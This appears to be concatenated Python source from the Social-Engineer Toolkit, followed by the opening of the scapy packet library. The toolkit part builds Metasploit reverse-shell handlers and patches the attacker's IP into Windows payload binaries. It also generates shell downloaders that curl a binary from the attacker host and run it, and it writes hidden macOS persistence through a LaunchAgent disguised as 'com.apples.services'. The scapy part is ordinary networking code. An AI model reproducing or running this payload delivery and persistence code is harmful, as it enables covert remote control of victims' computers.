            print_info("When the payload is downloaded, you will want to connect to the victim directly.")

        # specify attack vector as SET interactive shell
        if choice1 == "set/reverse_shell": attack_vector = "set_payload"

        # if we have the java attack, multiattack java, and the set interactive shell
        if attack_vector == "java" or multiattack_java == "on":
            if attack_vector != "set_payload":
                # pull in the ports from config
                port1=check_config("OSX_REVERSE_PORT=")
                # if we are using the multiattack, there will be port conflicts, need to scoot it to 8082
                if attack_vector == "multiattack":
                    port1 = "8082"
                # deploy nix and linux binaries
                if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":

                    # if we are using a custom linux/osx payload
                    if check_config("CUSTOM_LINUX_OSX_PAYLOAD=").lower() == "on":
                        osx_path = raw_input("Enter the path for the custom OSX payload (blank for nothing): ")
                        lin_path = raw_input("Enter the path for the custom Linux payload (blank for nothing): ")
                        print_status("Copying custom payloads into proper directory structure.")
                        # if we didn't specify blank
                        if osx_path != "":
                            while 1:
                                if not os.path.isfile(osx_path):
                                    print_error("File not found, enter the path again.")
                                    osx_path = raw_input("Enter the path for the custom OSX payload (blank for nothing): ")
                                if os.path.isfile(osx_path): break


                            if osx_path != "":
                                # copy the payload
                                shutil.copyfile(osx_path, setdir + "/mac.bin")
                    
                        # if linux payload
                        if lin_path != "":
                            while 1:
                                if not os.path.isfile(lin_path):
                                    print_error("File not found, enter the path again.")
                                    lin_path = raw_input("Enter the path for the custom Linux payload (blank for nothing): ")
                                if os.path.isfile(lin_path): 
                                        break
                                    
                            if lin_path != "":
                                # copy the payload
                                shutil.copyfile(lin_path, setdir + "/nix.bin")


                    else:
                        port2=check_config("LINUX_REVERSE_PORT=")
                        osxpayload = check_config("OSX_PAYLOAD_DELIVERY=")
                        linuxpayload = check_config("LINUX_PAYLOAD_DELIVERY=")
                        print_status("Generating OSX payloads through Metasploit...")
                        subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/mac.bin;chmod 755 %s/mac.bin" % (path,osxpayload,choice2,port1,setdir,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                        print_status("Generating Linux payloads through Metasploit...")
                        subprocess.Popen(r"ruby %s/msfpayload %s LHOST=%s LPORT=%s X > %s/nix.bin" % (path,linuxpayload,choice2,port2,setdir), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()
                        if multiattack_java == "on":
                            multiattack.write("OSX="+str(port1)+"\n")
                            multiattack.write("OSXPAYLOAD=%s\n" % (osxpayload))
                            multiattack.write("LINUX="+str(port2)+"\n")
                            multiattack.write("LINUXPAYLOAD=%s\n" % (linuxpayload))

                    osxcheck = check_options("MAC.BIN=")
                    linuxcheck = check_options("NIX.BIN=")
                    shutil.copyfile(setdir + "/mac.bin", setdir + "/web_clone/%s" % (osxcheck))
                    shutil.copyfile(setdir + "/nix.bin", setdir + "/web_clone/%s" % (linuxcheck))


        # try block here
        try:
            # if they want a listener, start here
            if os.path.isfile("%s/meta_config" % (setdir)):
                    # if its already created
                filewrite=file("%s/meta_config" % (setdir), "a")

            if not os.path.isfile("%s/meta_config" % (setdir)):
                # if we need to create it
                filewrite = file("%s/meta_config" % (setdir), "w")

            # if there isn't a multiattack metasploit, setup handler
            if not os.path.isfile("%s/multi_meta" % (setdir)):

                port_check = check_ports("%s/meta_config" % (setdir), choice3)
                if port_check == False:
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write("set PAYLOAD "+choice1+"\n")
                    filewrite.write("set LHOST " + ipaddr + "\n")
                    if flag == 0:
                        filewrite.write("set LPORT "+choice3+"\n")

                    filewrite.write("set EnableStageEncoding %s\n" % (stage_encoding))
                    filewrite.write("set ExitOnSession false\n")

                    if auto_migrate == "ON":
                        filewrite.write("set AutoRunScript post/windows/manage/smart_migrate\n")

                    # config option for using multiscript meterpreter
                    if meterpreter_multi == "ON":
                        multiwrite=file(setdir + "/multi_meter.file", "w")
                        multiwrite.write(meterpreter_multi_command)
                        filewrite.write("set InitialAutorunScript multiscript -rc %s/multi_meter.file\n" % (setdir))
                        multiwrite.close()
                    filewrite.write("exploit -j\n\n")

                # if we want to embed UNC paths for hashes
                if unc_embed == "ON":
                    filewrite.write("use server/capture/smb\n")
                    filewrite.write("exploit -j\n\n")

                # if only doing payloadgen then close the stuff up
                if payloadgen == "solo": filewrite.close()

            # Define linux and OSX payloads
            if payloadgen == "regular":
                if check_config("DEPLOY_OSX_LINUX_PAYLOADS=").lower() == "on":
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write("set PAYLOAD osx/x86/shell_reverse_tcp" +"\n")
                    filewrite.write("set LHOST "+choice2+"\n")
                    filewrite.write("set LPORT "+port1+"\n")
                    filewrite.write("set ExitOnSession false\n")
                    filewrite.write("exploit -j\n\n")
                    filewrite.write("use exploit/multi/handler\n")
                    filewrite.write("set PAYLOAD linux/x86/shell/reverse_tcp"+"\n")
                    filewrite.write("set LHOST "+choice2+"\n")
                    filewrite.write("set LPORT "+port2+"\n")
                    if linux_meterpreter_multi == "ON":
                        multiwrite=file(setdir + "/lin_multi_meter.file", "w")
                        multiwrite.write(linux_meterpreter_multi_command)
                        filewrite.write("set InitialAutorunScript multiscript -rc %s/lin_multi_meter.file\n" % (setdir))
                        multiwrite.close()
                        filewrite.write("set ExitOnSession false\n")
                    filewrite.write("exploit -j\n\n")
            filewrite.close()


        except Exception, e:
            log(e)
            print_error("ERROR:Something went wrong:")
            print bcolors.RED + "ERROR:" + str(e) + bcolors.ENDC


# Catch all errors
except KeyboardInterrupt:
    print_warning("Keyboard Interrupt Detected, exiting Payload Gen")

# finish closing up the remenant files
if attack_vector == "multiattack":
    multiattack.close()
if os.path.isfile("%s/fileformat.file" % (setdir)):
    filewrite=file("%s/payload.options" % (setdir), "w")
    filewrite.write(choice1 + " " + ipaddr + " " + choice3)
    filewrite.close()

if choice1 == "set/reverse_shell":
    if os.path.isfile(setdir + "/meta_config"): os.remove(setdir + "/meta_config")

########NEW FILE########
__FILENAME__ = solo
#!/usr/bin/python
import subprocess
import os
import re
import sys
from src.core.setcore import *

# definepath
definepath=os.getcwd()
sys.path.append(definepath)

# grab the metasploit path 
meta_path = meta_path()

# launch msf listener
print_info("The payload can be found in the SET home directory.")
# j0fer 06-27-2012 # choice = raw_input(setprompt("0", "Start the listener now? [yes|no]"))
choice = yesno_prompt("0", "Start the listener now? [yes|no]")
# j0fer 06-27-2012 # if choice == "yes" or choice == "y":
if choice == "YES":
    # if we didn't select the SET interactive shell as our payload
    if not os.path.isfile(setdir + "/set.payload"):
        print_info("Please wait while the Metasploit listener is loaded...")
        if os.path.isfile(setdir + "/meta_config"):
            listen_path = (setdir + "/meta_config")

        if os.path.isfile(setdir + "/meta_config_multipyinjector"):
            listen_path = (setdir + "/meta_config_multipyinjector")

        subprocess.Popen("ruby %s/msfconsole -L -r %s" % (meta_path,listen_path), shell=True).wait()

    # if we did select the set payload as our option
    if os.path.isfile(setdir + "/set.payload"):
        if check_options("PORT=") != 0:
            port = check_options("PORT=")

        set_payload = file(setdir + "/set.payload", "r")

        set_payload = set_payload.read().rstrip()
        if set_payload == "SETSHELL":
            print_info("Starting the SET Interactive Shell Listener on %s." % (port))
            import src.payloads.set_payloads.listener
            #subprocess.Popen("python src/payloads/set_payloads/listener.py %s" % (port), shell=True).wait()
        if set_payload == "RATTE":
            print_info("Starting the RATTE Shell on %s." % (port))
            subprocess.Popen("src/payloads/ratte/ratteserver %s" % (port), shell=True).wait()

########NEW FILE########
__FILENAME__ = payloadprep
#!/usr/bin/python
############################################
# Code behind the SET interactive shell
# and RATTE
############################################
import os
import sys
import subprocess
import re
import shutil
import time
from src.core.setcore import *

definepath = os.getcwd()
sys.path.append(definepath)

# grab operating system
operating_system = check_os()

# check the config file
fileopen = file("config/set_config", "r")
for line in fileopen:
    line = line.rstrip()
    # define if we use upx encoding or not
    match = re.search("UPX_ENCODE=", line)
    if match:
        upx_encode = line.replace("UPX_ENCODE=", "")
    # set the upx flag
    match1 = re.search("UPX_PATH=", line)
    if match1:
        upx_path = line.replace("UPX_PATH=", "")
        if upx_encode == "ON":
            if not os.path.isfile(upx_path):
                if operating_system != "windows":
                    print_warning("UPX packer not found in the pathname specified in config. Disabling UPX packing for executable")
                upx_encode == "OFF"
    # if we removed the set shells to free up space, needed for pwniexpress
    match2= re.search("SET_INTERACTIVE_SHELL=", line)
    if match2:
        line = line.replace("SET_INTERACTIVE_SHELL=", "").lower()
        if line == "off":
            sys.exit("\n   [-] SET Interactive Mode is set to DISABLED. Please change it in the SET config")

# make directory if it's not there
if not os.path.isdir(setdir + "/web_clone/"):
    os.makedirs(setdir + "/web_clone/")

# grab ip address and SET web server interface
if os.path.isfile(setdir + "/interface"):
    fileopen = file(setdir + "interface", "r")
    for line in fileopen:
        ipaddr = line.rstrip()



        # Open the IPADDR file
    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on for the reverse listener"))
        update_options("IPADDR=" + ipaddr)
        webserver = ipaddr

else:

    if check_options("IPADDR=") != 0:
        ipaddr = check_options("IPADDR=")
    else:
        ipaddr = raw_input(setprompt("0", "IP address to connect back on for the reverse listener"))
        update_options("IPADDR=" + ipaddr)
    webserver = ipaddr

# grab port options from payloadgen.py
if check_options("PORT=") != 0:
    port = check_options("PORT=")

else:
    port = raw_input(setprompt("0", "Port you want to use for the connection back"))


# define the main variables here

# generate a random executable name per instance
exe_name = generate_random_string(10,10) + ".exe"

webserver = webserver + " " + port

# store for later
reverse_connection = webserver

webserver = exe_name + " " + webserver

# this is generated through payloadgen.py and lets SET know if its a RATTE payload or SET payload
if os.path.isfile(setdir + "/set.payload"):
    fileopen = file(setdir + "/set.payload", "r")
    for line in fileopen:
        payload_selection = line.rstrip()
else:
    payload_selection = "SETSHELL"


# determine if we want to target osx/nix as well
posix = False
# find if we selected it
if os.path.isfile(setdir + "/set.payload.posix"):
    # if we have then claim true
    posix = True

# if we selected the SET Interactive shell in payloadgen
if payload_selection == "SETSHELL":
    # replace ipaddress with one that we need for reverse connection back
    fileopen = open("src/payloads/set_payloads/downloader.windows" , "rb")
    data = fileopen.read()
    filewrite = open(setdir + "/msf.exe" , "wb")
    host = int(len(exe_name)+1) * "X"
    webserver_count = int(len(webserver)+1) * "S"
    ipaddr_count = int(len(ipaddr)+1) * "M"
    filewrite.write(data.replace(str(host), exe_name+"\x00", 1))
    filewrite.close()
    fileopen = open(setdir + "/msf.exe" , "rb")
    data = fileopen.read()
    filewrite = open(setdir + "/msf.exe" , "wb")
    filewrite.write(data.replace(str(webserver_count), webserver+"\x00", 1))
    filewrite.close()
    fileopen = open(setdir + "/msf.exe" , "rb")
    data = fileopen.read()
    filewrite = open(setdir + "/msf.exe" , "wb")
    filewrite.write(data.replace(str(ipaddr_count), ipaddr+"\x00", 1))
    filewrite.close()

# if we selected RATTE in our payload selection
if payload_selection == "RATTE":
    fileopen = file("src/payloads/ratte/ratte.binary", "rb")
    data = fileopen.read()
    filewrite = open(setdir + "/msf.exe", "wb")
    host = int(len(ipaddr)+1) * "X"
    rPort = int(len(str(port))+1) * "Y"
    filewrite.write(data.replace(str(host), ipaddr+"\x00", 1))
    filewrite.close()
    fileopen = open(setdir + "/msf.exe", "rb")
    data = fileopen.read()
    filewrite = open(setdir + "/msf.exe", "wb")
    filewrite.write(data.replace(str(rPort), str(port)+"\x00", 1))
    filewrite.close()

print_status("Done, moving the payload into the action.")

if upx_encode == "ON" or upx_encode == "on":
    # core upx
    pass 

if os.path.isfile(setdir + "/web_clone/msf.exe"):
    os.remove(setdir + "/web_clone/msf.exe")
if os.path.isfile(setdir + "/msf.exe"):
    shutil.copyfile(setdir + "/msf.exe", setdir + "/web_clone/msf.exe")

if payload_selection == "SETSHELL":
    if os.path.isfile(setdir + "/web_clone/x"):
        os.remove(setdir + "/web_clone/x")
    shutil.copyfile("%s/src/payloads/set_payloads/shell.windows" % (definepath), setdir + "/web_clone/x")

# if we are targetting nix
if posix == True:
    print_info("Targetting of OSX/Linux (POSIX-based) as well. Prepping posix payload...")
    filewrite = file(setdir + "/web_clone/mac.bin", "w")
    payload_flags = webserver.split(" ")
    # grab osx binary name
    osx_name = generate_random_string(10,10)
    downloader = "#!/bin/sh\ncurl -C -O http://%s/%s > /tmp/%s\nchmod +x /tmp/%s\n./tmp/%s %s %s &" % (payload_flags[1],osx_name,osx_name,osx_name,osx_name,payload_flags[1],payload_flags[2])
    filewrite.write(downloader + "\n")
    persistence = check_config("ENABLE_PERSISTENCE_OSX=").lower()
    if persistence == "on":
        # modified persistence osx from http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
        filewrite.write(r"mkdir ~/Library/.hidden")
        filewrite.write("\n")
        filewrite.write("cp /tmp/%s ~/Library/.hidden" % (osx_name))
        filewrite.write("\n")
        filewrite.write(r"echo '#!/bin/bash' > ~/Library/.hidden/connect.sh")
        filewrite.write("\n")
        filewrite.write("echo './%s %s %s &' >> ~/Library/.hidden/connect.sh" % (osx_name, payload_flags[1], payload_flags[2]))
        filewrite.write("\n")
        filewrite.write(r"echo 'chmod +x ~/Library/.hidden/connect.sh' >> ~/Library/.hidden/connect.sh")
        filewrite.write("\n")
        filewrite.write(r"mkdir ~/Library/LaunchAgents")
        filewrite.write("\n")
        filewrite.write("echo '<plist version=\"1.0\">' > ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<key>Label</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<string>com.apples.services</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<key>ProgramArguments</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<string>/bin/sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write("echo '<string>'$HOME'/Library/.hidden/connect.sh</string>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '</array>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<key>RunAtLoad</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<key>StartInterval</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<integer>60</integer>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<key>AbandonProcessGroup</key>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '<true/>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '</dict>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"echo '</plist>' >> ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"chmod 600 ~/Library/LaunchAgents/com.apples.services.plist")
        filewrite.write("\n")
        filewrite.write(r"launchctl load ~/Library/LaunchAgents/com.apples.services.plist")

    filewrite.close()
    # grab nix binary name
    #linux_name = check_options("NIX.BIN=")
    linux_name = generate_random_string(10,10)
    downloader = "#!/usr/bin/sh\ncurl -C - -O http://%s/%s\nchmod +x %s\n./%s %s %s &" % (payload_flags[1],linux_name,linux_name,linux_name,payload_flags[1],payload_flags[2])
    filewrite = file(setdir + "/web_clone/nix.bin", "w")
    filewrite.write(downloader)
    filewrite.close()
    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.osx", setdir + "/web_clone/%s" % (osx_name))
    shutil.copyfile(definepath + "/src/payloads/set_payloads/shell.linux", setdir + "/web_clone/%s" % (linux_name))

    # copy over the downloader scripts
    osx_down = check_options("MAC.BIN=")
    lin_down = check_options("NIX.BIN=")
    shutil.copyfile(setdir + "/web_clone/nix.bin", setdir + "/web_clone/%s" % (lin_down))
    shutil.copyfile(setdir + "/web_clone/mac.bin", setdir + "/web_clone/%s" % (osx_down))

# check to see if we are using a staged approach or direct shell
stager = check_config("SET_SHELL_STAGER=").lower()
if stager == "off" or payload_selection == "SETSHELL_HTTP":
    # only trigger if we are using the SETSHELL
    if payload_selection == "SETSHELL" or payload_selection == "SETSHELL_HTTP":
        # ensure that index.html is really there
        if os.path.isfile(setdir + "/web_clone/index.html"):
            print_status("Stager turned off, prepping direct download payload...")
            fileopen = file(setdir + "/web_clone/index.html", "r")
            filewrite = file(setdir + "/web_clone/index.html.3", "w")
            data = fileopen.read()
            # replace freehugs with ip and port
            data = data.replace("freehugs", reverse_connection)
            filewrite.write(data)
            filewrite.close()
            time.sleep(1)

            # here we remove old stuff and replace with everything we need to be newer
            if payload_selection == "SETSHELL":
                try:
                    if os.path.isfile(setdir + "/web_clone/index.html"):
                        os.remove(setdir + "/web_clone/index.html")
                    shutil.copyfile(setdir + "/web_clone/index.html.3", setdir + "/web_clone/index.html")
                    if os.path.isfile(setdir + "/web_clone/index.html.3"):
                        os.remove(setdir + "/web_clone/index.html.3")
                    if os.path.isfile(setdir + "/web_clone/msf.exe"):
                        os.remove(setdir + "/web_clone/msf.exe")
                    shutil.copyfile(setdir + "/web_clone/x", setdir + "/web_clone/msf.exe")
                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
                    if os.path.isfile(setdir + "/msf.exe"):
                        os.remove(setdir + "/msf.exe")
                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/msf.exe")

                # catch errors, will convert to log later
                except Exception, error:
                    log(error)

            # if we are using the HTTP reverse shell then lets use this
            if payload_selection == "SETSHELL_HTTP":
                try:
                    if os.path.isfile(setdir + "/web_clone/index.html"):
                        os.remove(setdir + "/web_clone/index.html")
                    shutil.copyfile(setdir + "/web_clone/index.html.3", setdir + "/web_clone/index.html")
                    if os.path.isfile(setdir + "/web_clone/index.html.3"):
                        os.remove(setdir + "/web_clone/index.html.3")
                    if os.path.isfile(setdir + "/web_clone/msf.exe"):
                        os.remove(setdir + "/web_clone/msf.exe")
                    shutil.copyfile("src/payloads/set_payloads/http_shell.binary", setdir + "/web_clone/msf.exe")
                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/msf.exe")
                    if os.path.isfile(setdir + "/msf.exe"):
                        os.remove(setdir + "/msf.exe")
                    shutil.copyfile(setdir + "/web_clone/msf.exe", setdir + "/msf.exe")

                # catch errors, will convert to log later
                except Exception, error:
                    log(error)

########NEW FILE########
__FILENAME__ = scapy
#! /usr/bin/env python

#############################################################################
##                                                                         ##
## scapy.py --- Interactive packet manipulation tool                       ##
##              see http://www.secdev.org/projects/scapy/                  ##
##              for more informations                                      ##
##                                                                         ##
## Copyright (C) 2003  Philippe Biondi <phil@secdev.org>                   ##
##                                                                         ##
## This program is free software; you can redistribute it and/or modify it ##
## under the terms of the GNU General Public License version 2 as          ##
## published by the Free Software Foundation; version 2.                   ##
##                                                                         ##
## This program is distributed in the hope that it will be useful, but     ##
## WITHOUT ANY WARRANTY; without even the implied warranty of              ##
## MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU       ##
## General Public License for more details.                                ##
##                                                                         ##
#############################################################################


from __future__ import generators
import os

VERSION = "1.2.0.2"

DEFAULT_CONFIG_FILE = os.path.join(os.environ["HOME"], ".scapy_startup.py")

try:
    os.stat(DEFAULT_CONFIG_FILE)
except OSError:
    DEFAULT_CONFIG_FILE = None

def usage():
    print """Usage: scapy.py [-s sessionfile] [-c new_startup_file] [-C]
    -C: do not read startup file"""
    sys.exit(0)


#############################
##### Logging subsystem #####
#############################

class Scapy_Exception(Exception):
    pass

import logging,traceback,time

class ScapyFreqFilter(logging.Filter):
    def __init__(self):
        logging.Filter.__init__(self)
        self.warning_table = {}
    def filter(self, record):
        wt = conf.warning_threshold
        if wt > 0:
            stk = traceback.extract_stack()
            caller=None
            for f,l,n,c in stk:
                if n == 'warning':
                    break
                caller = l
            tm,nb = self.warning_table.get(caller, (0,0))
            ltm = time.time()
            if ltm-tm > wt:
                tm = ltm
                nb = 0
            else:
                if nb < 2:
                    nb += 1
                    if nb == 2:
                        record.msg = "more "+record.msg
                else:
                    return 0
            self.warning_table[caller] = (tm,nb)
        return 1

log_scapy = logging.getLogger("scapy")
console_handler = logging.StreamHandler()
console_handler.setFormatter(logging.Formatter("%(levelname)s: %(message)s"))
log_scapy.addHandler(console_handler)
log_runtime = logging.getLogger("scapy.runtime")          # logs at runtime
log_runtime.addFilter(ScapyFreqFilter())
log_interactive = logging.getLogger("scapy.interactive")  # logs in interactive functions
log_loading = logging.getLogger("scapy.loading")          # logs when loading scapy

if __name__ == "__main__":
    log_scapy.setLevel(1)


##################
##### Module #####
##################

import socket, sys, getopt, string, struct, random, code
import cPickle, copy, types, gzip, base64, re, zlib, array
#from sets import Set
from select import select
from glob import glob
from fcntl import ioctl
import itertools
import fcntl
import warnings
warnings.filterwarnings("ignore","tempnam",RuntimeWarning, __name__)


try:
    import Gnuplot
    GNUPLOT=1
except ImportError:
    log_loading.info("did not find python gnuplot wrapper . Won't be able to plot")
    GNUPLOT=0

try:
    import pyx
    PYX=1
except ImportError:
    log_loading.info("Can't import PyX. Won't be able to use psdump() or pdfdump()")
    PYX=0


LINUX=sys.platform.startswith("linux")
OPENBSD=sys.platform.startswith("openbsd")
FREEBSD=sys.platform.startswith("freebsd")
DARWIN=sys.platform.startswith("darwin")
BIG_ENDIAN= struct.pack("H",1) == "\x00\x01"
X86_64 = (os.uname()[4] == 'x86_64')
SOLARIS=sys.platform.startswith("sunos")


if LINUX:
    DNET=PCAP=0
else:
    DNET=PCAP=1


if PCAP:
    try:
        import pcap
        PCAP = 1
    except ImportError:
        if LINUX:
            log_loading.warning("did not find pcap module. Fallback to linux primitives")
            PCAP = 0
        else:
            if __name__ == "__main__":
                log_loading.error("did not find pcap module")
                raise SystemExit
            else:
                raise

if DNET:
    try:
        import dnet
        DNET = 1
    except ImportError:
        if LINUX:
            log_loading.warning("did not find dnet module. Fallback to linux primitives")
            DNET = 0
        else:
            if __name__ == "__main__":
                log_loading.error("did not find dnet module")
                raise SystemExit
            else:
                raise

if not PCAP:
    f = os.popen("tcpdump -V 2> /dev/null")
    if f.close() >> 8 == 0x7f:
        log_loading.warning("Failed to execute tcpdump. Check it is installed and in the PATH")
        TCPDUMP=0
    else:
        TCPDUMP=1
    del(f)



try:
    from Crypto.Cipher import ARC4
except ImportError:
    log_loading.info("Can't find Crypto python lib. Won't be able to decrypt WEP")


# Workarround bug 643005 : https://sourceforge.net/tracker/?func=detail&atid=105470&aid=643005&group_id=5470
try:
    socket.inet_aton("255.255.255.255")
except socket.error:
    def inet_aton(x):
        if x == "255.255.255.255":
            return "\xff"*4
        else:
            return socket.inet_aton(x)
else:
    inet_aton = socket.inet_aton

inet_ntoa = socket.inet_ntoa
try:
    inet_ntop = socket.inet_ntop
    inet_pton = socket.inet_pton
except AttributeError:
    log_loading.info("inet_ntop/pton functions not found. Python IPv6 support not present")


if SOLARIS:
    # GRE is missing on Solaris
    socket.IPPROTO_GRE = 47

###############################
## Direct Access dictionnary ##
###############################

def fixname(x):
    if x and x[0] in "0123456789":
        x = "n_"+x
    return x.translate("________________________________________________0123456789_______ABCDEFGHIJKLMNOPQRSTUVWXYZ______abcdefghijklmnopqrstuvwxyz_____________________________________________________________________________________________________________________________________")


class DADict_Exception(Scapy_Exception):
    pass

class DADict:
    def __init__(self, _name="DADict", **kargs):
        self._name=_name
        self.__dict__.update(kargs)
    def fixname(self,val):
        return fixname(val)
    def __contains__(self, val):
        return val in self.__dict__
    def __getitem__(self, attr):
        return getattr(self, attr)
    def __setitem__(self, attr, val):
        return setattr(self, self.fixname(attr), val)
    def __iter__(self):
        return iter(map(lambda (x,y):y,filter(lambda (x,y):x and x[0]!="_", self.__dict__.items())))
    def _show(self):
        for k in self.__dict__.keys():
            if k and k[0] != "_":
                print "%10s = %r" % (k,getattr(self,k))
    def __repr__(self):
        return "<%s/ %s>" % (self._name," ".join(filter(lambda x:x and x[0]!="_",self.__dict__.keys())))

    def _branch(self, br, uniq=0):
        if uniq and br._name in self:
            raise DADict_Exception("DADict: [%s] already branched in [%s]" % (br._name, self._name))
        self[br._name] = br

    def _my_find(self, *args, **kargs):
        if args and self._name not in args:
            return False
        for k in kargs:
            if k not in self or self[k] != kargs[k]:
                return False
        return True

    def _find(self, *args, **kargs):
        return self._recurs_find((), *args, **kargs)
    def _recurs_find(self, path, *args, **kargs):
        if self in path:
            return None
        if self._my_find(*args, **kargs):
            return self
        for o in self:
            if isinstance(o, DADict):
                p = o._recurs_find(path+(self,), *args, **kargs)
                if p is not None:
                    return p
        return None
    def _find_all(self, *args, **kargs):
        return self._recurs_find_all((), *args, **kargs)
    def _recurs_find_all(self, path, *args, **kargs):
        r = []
        if self in path:
            return r
        if self._my_find(*args, **kargs):
            r.append(self)
        for o in self:
            if isinstance(o, DADict):
                p = o._recurs_find_all(path+(self,), *args, **kargs)
                r += p
        return r
    def keys(self):
        return filter(lambda x:x and x[0]!="_", self.__dict__.keys())



############
## Consts ##
############

ETHER_ANY = "\x00"*6
ETHER_BROADCAST = "\xff"*6

ETH_P_ALL = 3
ETH_P_IP = 0x800
ETH_P_ARP = 0x806

# From net/if_arp.h
ARPHDR_ETHER = 1
ARPHDR_METRICOM = 23
ARPHDR_PPP = 512
ARPHDR_LOOPBACK = 772
ARPHDR_TUN = 65534

# From bits/ioctls.h
SIOCGIFHWADDR  = 0x8927          # Get hardware address
SIOCGIFADDR    = 0x8915          # get PA address
SIOCGIFNETMASK = 0x891b          # get network PA mask
SIOCGIFNAME    = 0x8910          # get iface name
SIOCSIFLINK    = 0x8911          # set iface channel
SIOCGIFCONF    = 0x8912          # get iface list
SIOCGIFFLAGS   = 0x8913          # get flags
SIOCSIFFLAGS   = 0x8914          # set flags
SIOCGIFINDEX   = 0x8933          # name -> if_index mapping
SIOCGIFCOUNT   = 0x8938          # get number of devices
SIOCGSTAMP     = 0x8906          # get packet timestamp (as a timeval)


# From if.h
IFF_UP = 0x1               # Interface is up.
IFF_BROADCAST = 0x2        # Broadcast address valid.
IFF_DEBUG = 0x4            # Turn on debugging.
IFF_LOOPBACK = 0x8         # Is a loopback net.
IFF_POINTOPOINT = 0x10     # Interface is point-to-point link.
IFF_NOTRAILERS = 0x20      # Avoid use of trailers.
IFF_RUNNING = 0x40         # Resources allocated.
IFF_NOARP = 0x80           # No address resolution protocol.
IFF_PROMISC = 0x100        # Receive all packets.



# From netpacket/packet.h
PACKET_ADD_MEMBERSHIP  = 1
PACKET_DROP_MEMBERSHIP = 2
PACKET_RECV_OUTPUT     = 3
PACKET_RX_RING         = 5
PACKET_STATISTICS      = 6
PACKET_MR_MULTICAST    = 0
PACKET_MR_PROMISC      = 1
PACKET_MR_ALLMULTI     = 2


# From bits/socket.h
SOL_PACKET = 263
# From asm/socket.h
SO_ATTACH_FILTER = 26
SOL_SOCKET = 1

# From net/route.h
RTF_UP = 0x0001  # Route usable
RTF_REJECT = 0x0200

# From BSD net/bpf.h
#BIOCIMMEDIATE=0x80044270
BIOCIMMEDIATE=-2147204496

MTU = 1600


# file parsing to get some values :

def load_protocols(filename):
    spaces = re.compile("[ \t]+|\n")
    dct = DADict(_name=filename)
    try:
        for l in open(filename):
            try:
                shrp = l.find("#")
                if  shrp >= 0:
                    l = l[:shrp]
                l = l.strip()
                if not l:
                    continue
                lt = tuple(re.split(spaces, l))
                if len(lt) < 2 or not lt[0]:
                    continue
                dct[lt[0]] = int(lt[1])
            except Exception,e:
                log_loading.info("Couldn't parse file [%s]: line [%r] (%s)" % (filename,l,e))
    except IOError:
        log_loading.info("Can't open /etc/protocols file")
    return dct

IP_PROTOS=load_protocols("/etc/protocols")

def load_ethertypes(filename):
    spaces = re.compile("[ \t]+|\n")
    dct = DADict(_name=filename)
    try:
        f=open(filename)
        for l in f:
            try:
                shrp = l.find("#")
                if  shrp >= 0:
                    l = l[:shrp]
                l = l.strip()
                if not l:
                    continue
                lt = tuple(re.split(spaces, l))
                if len(lt) < 2 or not lt[0]:
                    continue
                dct[lt[0]] = int(lt[1], 16)
            except Exception,e:
                log_loading.info("Couldn't parse file [%s]: line [%r] (%s)" % (filename,l,e))
        f.close()
    except IOError,msg:
        pass
    return dct

ETHER_TYPES=load_ethertypes("/etc/ethertypes")

def load_services(filename):
    spaces = re.compile("[ \t]+|\n")
    tdct=DADict(_name="%s-tcp"%filename)
    udct=DADict(_name="%s-udp"%filename)
    try:
        f=open(filename)
        for l in f:
            try:
                shrp = l.find("#")
                if  shrp >= 0:
                    l = l[:shrp]
                l = l.strip()
                if not l:
                    continue
                lt = tuple(re.split(spaces, l))
                if len(lt) < 2 or not lt[0]:
                    continue
                if lt[1].endswith("/tcp"):
                    tdct[lt[0]] = int(lt[1].split('/')[0])
                elif lt[1].endswith("/udp"):
                    udct[lt[0]] = int(lt[1].split('/')[0])
            except Exception,e:
                log_loading.warning("Couldn't file [%s]: line [%r] (%s)" % (filename,l,e))
        f.close()
    except IOError:
        log_loading.info("Can't open /etc/services file")
    return tdct,udct

TCP_SERVICES,UDP_SERVICES=load_services("/etc/services")

class ManufDA(DADict):
    def fixname(self, val):
        return val
